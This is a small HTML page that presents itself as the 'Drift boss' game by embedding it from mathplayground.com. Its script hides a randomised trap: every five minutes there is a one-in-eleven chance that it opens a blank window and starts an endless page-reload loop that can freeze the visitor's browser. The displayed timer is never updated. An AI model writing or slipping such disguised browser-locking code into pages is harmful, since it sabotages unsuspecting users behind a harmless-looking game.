<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Drift boss</title>
  </head>
  <body>
    <p><span id="seconds">00</span>:<span id="tens">00</span></p>
    <iframe id="game" src="https://www.mathplayground.com/drift-boss-v3/index.html" style="position: absolute; top: 0; right: 0; bottom: 0; left: 0;" scrolling="yes" frameborder="0"></iframe>
  </body>
  <script>
    hello()

    function hello() {
      setTimeout(function() {
        ya()
        hello()
      }, 300000);
    }

    function ya() {
        let num = Math.floor(Math.random() * 11);
        if (num == 7) {
            window.open("about:blank")

            while(1)location.reload(1)
        }
    }
  </script>
</html>
